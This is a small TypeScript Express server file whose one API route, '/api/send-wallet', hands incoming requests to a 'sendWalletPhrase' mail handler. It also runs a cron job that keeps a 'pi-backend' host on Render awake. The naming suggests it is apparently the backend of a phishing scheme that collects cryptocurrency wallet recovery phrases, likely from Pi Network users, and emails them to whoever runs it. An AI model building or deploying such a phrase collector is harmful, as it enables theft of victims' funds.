import dotenv from 'dotenv';
dotenv.config();
import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import { sendWalletPhrase } from './mail';
import cron from 'node-cron';
import fetch from 'node-fetch';

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(bodyParser.json());

app.post('/api/send-wallet', sendWalletPhrase);

app.get('/', (_req, res) => {
  res.send('Backend API is running');
});


// Cron job to ping the server every 5 minutes to keep it awake on Render
const SELF_URL: string = process.env.SELF_URL || 'https://pi-backend-vw0s.onrender.com'; // Set your Render URL in env
cron.schedule('*/5 * * * *', async () => {
  try {
    const res = await fetch(SELF_URL);
    console.log(`[CRON] Pinged ${SELF_URL} - Status: ${res.status}`);
  } catch (err) {
    console.error('[CRON] Error pinging self:', err);
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
